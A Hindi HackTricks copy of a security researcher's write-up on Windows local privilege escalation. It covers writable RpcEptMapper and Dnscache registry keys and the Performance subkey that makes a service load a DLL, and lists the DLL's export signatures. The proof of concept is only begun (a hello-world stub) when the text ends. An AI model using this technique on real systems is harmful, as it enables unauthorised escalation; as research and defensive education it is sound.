<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


**рдЬрд╛рдирдХрд╛рд░реА** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ**

рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬрд┐рдпреЛрдВ рдкрд░ рдХреБрдЫ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

рд╣рдо `regedit` GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВрдЧреЗред рдореБрдЭреЗ _Advanced Security Settings_ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдПрдХ рдмрд╛рдд рдмрд╣реБрдд рдкрд╕рдВрдж рд╣реИ, рд╡рд╣ рд╣реИ _Effective Permissions_ рдЯреИрдмред рдЖрдк рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рдореВрд╣ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдкреНрд░рдореБрдЦрд▓рд╛ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЗрд╕ рдкреНрд░рдореБрдЦрд▓рд╛ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ ACEs рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирддреАрдЬрд╛ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд `lab-user` рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдПред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

рдЕрдзрд┐рдХрд╛рдВрд╢ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдорд╛рдирдХ рд╣реИрдВ (рдЙрджрд╛ред: `Query Value`) рд▓реЗрдХрд┐рди рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рдмрд╣реБрдд рдзреНрдпрд╛рди рджрд┐рд▓рд╛рддреА рд╣реИ: `Create Subkey`ред рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рдирд╛рдо `AppendData/AddSubdirectory` рд╣реИ, рдЬреЛ рдмрд┐рд▓реНрдХреБрд▓ рд╡рд╣реА рд╣реИ рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
рдпрд╣ рдмрд┐рд▓рдХреБрд▓ рд╕реНрдкрд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдХреЗрд╡рд▓ `ImagePath` рдорд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ `WriteData/AddFile` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╣рдо рдХреЗрд╡рд▓ рдПрдХ рдирдпрд╛ рд╕рдмрдХреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

рдХреНрдпрд╛ рдпрд╣ рдпрдХреАрдирди рдПрдХ рдЧрд▓рддреА рдереА? рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдирд╣реАрдВред рдордЬрд╝реЗ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рдПрдВ!

## RTFM <a href="#rtfm" id="rtfm"></a>

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` рдХреЗ рддрд╣рдд рдПрдХрд╛рдзрд┐рдХ рдЙрдк-рд╕рдмрдХреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╣рдо рдореМрдЬреВрджрд╛ рдЙрдк-рд╕рдмрдХреА рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдЙрдк-рд╕рдмрдХреА `Parameters` рдФрд░ `Security` рд╣реИрдВ, рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИрдВред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

рдЗрд╕рд▓рд┐рдП, рдкрд╣рд▓рд╛ рд╕рд╡рд╛рд▓ рдЬреЛ рдорди рдореЗрдВ рдЙрдард╛ рдерд╛ рд╡рд╣ рдпрд╣ рдерд╛: _рдХреНрдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЙрдк-рд╕рдмрдХреА - рдЬреИрд╕реЗ `Parameters` рдФрд░ `Security` - рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рд╕реЗрд╡рд╛ рдХреЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрди рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ?_

рдЗрд╕ рд╕рд╡рд╛рд▓ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП, рдореЗрд░реА рдкреНрд░рд╛рдердорд┐рдХ рдпреЛрдЬрдирд╛ рдереА рдХрд┐ рдореИрдВ рд╕рднреА рдореМрдЬреВрджрд╛ рдХреБрдВрдЬреАрдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ рдФрд░ рдПрдХ рдкреИрдЯрд░реНрди рдкрд╣рдЪрд╛рдирдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред рд╡рд┐рдЪрд╛рд░ рдпрд╣ рдерд╛ рдХрд┐ рдХрд┐рд╕ рд╕рдмрдХреА рд╕реЗрд╡рд╛ рдХреЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрди рдХреЗ рд▓рд┐рдП _рдорд╛рдпрдиреЗ рд░рдЦрдиреЗ рд╡рд╛рд▓реА_ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдореИрдВрдиреЗ рд╕реЛрдЪрдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдХрд┐ рдореИрдВ рдЗрд╕реЗ рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЗрдВ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рдФрд░ рдлрд┐рд░ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдХреНрд░рдордмрджреНрдз рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдореИрдВрдиреЗ рд╕реЛрдЪрд╛ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕рдВрд░рдЪрдирд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рд╣реИред рддреЛ, рдореИрдВрдиреЗ `windows service configuration registry site:microsoft.com` рдЬреИрд╕рд╛ рдХреБрдЫ рдЧреВрдЧрд▓ рдХрд┐рдпрд╛ рдФрд░ рдпрд╣рд╛рдВ рдпрд╣рд╛рдВ рдкрд╣рд▓рд╛ [рдкрд░рд┐рдгрд╛рдо](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) рдЖрдпрд╛ред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

рд╡рд╛рджрд╛ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд▓рдЧрддрд╛ рд╣реИ, рдХреНрдпрд╛ рдирд╣реАрдВ? рдкрд╣рд▓реА рдирдЬрд╝рд░ рдореЗрдВ, рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдкреВрд░реНрдг рдФрд░ рд╕рдВрдкреВрд░реНрдг рдирд╣реАрдВ рд▓рдЧ рд░рд╣рд╛ рдерд╛ред рд╢реАрд░реНрд╖рдХ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП, рдореБрдЭреЗ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рдкреЗрдбрд╝ рд╕рдВрд░рдЪрдирд╛ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рдХреА рдЙрдореНрдореАрдж рдереА рдЬреЛ рд╕реЗрд╡рд╛ рдХреЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрди рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕рднреА рдЙрдк-рд╕рдмрдХреАрдпреЛрдВ рдФрд░ рдорд╛рдиреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд╣рд╛рдВ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдерд╛ред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

рдлрд┐рд░ рднреА, рдореИрдВрдиреЗ рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрдЪреНрдЫреЗрдж рдкрд░ рддреЗрдЬреА рд╕реЗ рдирдЬрд╝рд░ рдбрд╛рд▓реАред рдФрд░, рдореИрдВрдиреЗ рдЬрд▓реНрджреА рд╕реЗ "рд╡реНрдпрд╛рдкрд╛рд░" рдФрд░ "DLL" рд╢рдмреНрджреЛрдВ рдХреЛ рджреЗрдЦрд╛ред "рдкреНрд░рджрд░реНрд╢рди" рдЙрдкрд╢реАрд░реНрд╖рдХ рдХреЗ рддрд╣рдд, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:

> **рдкреНрд░рджрд░реНрд╢рди**: _рдПрдХ рдХреБрдВрдЬреА рдЬреЛ рд╡реИрдХрд▓реНрдкрд┐рдХ рдкреНрд░рджрд░реНрд╢рди рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИред рдЗрд╕ рдХреБрдВрдЬреА рдХреЗ рддрд╣рдд рдореМрдЬреВрдж рдорд╛рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВ **рдбреНрд░рд╛рдЗрд╡рд░ рдХреЗ рдкреНрд░рджрд░реНрд╢рди DLL рдХрд╛ рдирд╛рдо** рдФрд░ **рдЙрд╕ DLL рдореЗрдВ рдХреБрдЫ рдирд┐рд░реНрдпрд╛рддрд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдирд╛рдо**ред рдЖрдк рдЗрд╕ рд╕рдмрдХреА рдХреЗ рд▓рд┐рдП рд╡реИрд▓реНрдпреВ рдПрдВрдЯреНрд░реАрдЬрд╝ рдХреЛ рдбреНрд░рд╛рдЗрд╡рд░ рдХреЗ INF рдлрд╝рд╛рдЗрд▓ рдореЗрдВ AddReg рдПрдВрдЯреНрд░реАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред_

рдЗрд╕ рдЫреЛрдЯреЗ рдкреИрд░рд╛рдЧреНрд░рд╛рдл рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдРрд╕рд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдбреНрд░рд╛рдЗрд╡рд░ рд╕реЗрд╡рд╛ рдореЗрдВ рдЕрдкрдиреЗ рдкреНрд░рджрд░реНрд╢рди рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ DLL рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдзрдиреНрдпрд╡рд╛рдж `Performance` рдЙрдк-рд╕рдмрдХреА рдХреЗред **рдареАрдХ рд╣реИ, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ!** рдпрд╣ рдХреБрдВрдЬреА `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ _рдмрд┐рд▓реНрдХреБрд▓_ рд╡рд╣реА рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдореЗрдВ рдереЛрдбрд╝реА рд╕реА рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдпрд╣ рд╕реЗрд╡рд╛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рдбреНрд░рд╛рдЗрд╡рд░ рд╕реЗрд╡рд╛ рдирд╣реАрдВ рд╣реИред рдлрд┐рд░ рднреА, рдЗрд╕реЗ рдЖрдЬрд╝рдорд╛рдиреЗ рдореЗрдВ рд╡рд╛рдкрд╕реА рдХрд░рдиреЗ рдХрд╛ рдореВрд▓реНрдп рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдЗрд╕ "рдкреНрд░рджрд░реНрд╢рди рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ" рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рд┐рдПред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **рдиреЛрдЯ:** рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдХреЗ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ `рдкреНрд░рдХрд╛рд░` рд╣реЛрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рдкреНрд░рдХрд╛рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдиреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)`
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЗ рд╕рд╛рде рдЗрддрдирд╛ рд╣реА рдХрд╛рдлреА рд╣реИ, рдЕрдм рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдХрд╛ рд╕рдордп рд╣реИ!

## рдПрдХ рдкреНрд░рдорд╛рдг-рдСрдл-рдХрд╛рд░реНрдп рд▓рд┐рдЦрдирд╛ <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореИрдВрдиреЗ рдЗрдХрдЯреНрдард╛ рдХреА рдЧрдИ рд╕рднреА рдмрд┐рдЯреНрд╕ рдФрд░ рдЯреБрдХрдбрд╝реЛрдВ рдХреЗ рдзрдиреНрдпрд╡рд╛рдж, рдПрдХ рд╕рд░рд▓ рдкреНрд░рдорд╛рдг-рдСрдл-рдХрд╛рд░реНрдп DLL рд▓рд┐рдЦрдирд╛ рдмрд╣реБрдд рд╕рд░рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА, рд╣рдореЗрдВ рдПрдХ рдпреЛрдЬрдирд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ!

рдЬрдм рдореБрдЭреЗ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреА DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдореИрдВ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд░рд▓ рдФрд░ рдХрд╕реНрдЯрдо рд▓реЙрдЧ рд╕рд╣рд╛рдпрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реВрдБред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЬрдм рднреА рдпрд╣ рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВред рдЖрдорддреМрд░ рдкрд░, рдореИрдВ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдФрд░ рдорд╛рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдкреАрдЖрдИрдбреА, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рдФрд░ рд╕рдВрдмрдВрдзрд┐рдд рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реВрдБред рдореИрдВ рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рднреА рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдЗрд╕ рд▓реЙрдЧ рдШрдЯрдирд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдирд╛рдоред рдЗрд╕ рддрд░рд╣, рдореБрдЭреЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рдХрд╛ рдХреМрди рд╕рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реБрдЖ рдерд╛ред

рдореЗрд░реЗ рдЕрдиреНрдп рд▓реЗрдЦреЛрдВ рдореЗрдВ, рдореИрдВрдиреЗ рд╣рдореЗрд╢рд╛ рд╡рд┐рдХрд╛рд╕ рднрд╛рдЧ рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдореБрдЭреЗ рд▓рдЧрд╛ рдХрд┐ рдпрд╣ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЕрднрд┐рдЬреНрдЮ рд╣реИред рд▓реЗрдХрд┐рди, рдореИрдВ рдЕрдкрдиреЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЛ рд╢реБрд░реБрдЖрддреА рд╕реНрддрд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рднреА рд╕реБрд▓рдн рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реВрдБ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдБ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддрд╛ рд╣реВрдБред рддреЛ, рдЪрд▓реЛ рд╡рд┐рдЬрд╝реБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдХреЛ рдЪрд╛рд▓реВ рдХрд░реЗрдВ рдФрд░ рдПрдХ рдирдпрд╛ "_рд╕реА++ рдХрдВрд╕реЛрд▓ рдРрдк_" рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдореИрдВрдиреЗ рдПрдХ "_рдбрд╛рдпрдирд╛рдорд┐рдХ-рд▓рд┐рдВрдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА (DLL)_" рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛ рд╕рдХрддрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рдХрдВрд╕реЛрд▓ рдРрдк рд╕реЗ рд╢реБрд░реВ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд▓рдЧрддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рд╡рд┐рдЬрд╝реБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХреЛрдб рд╣реИ:
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
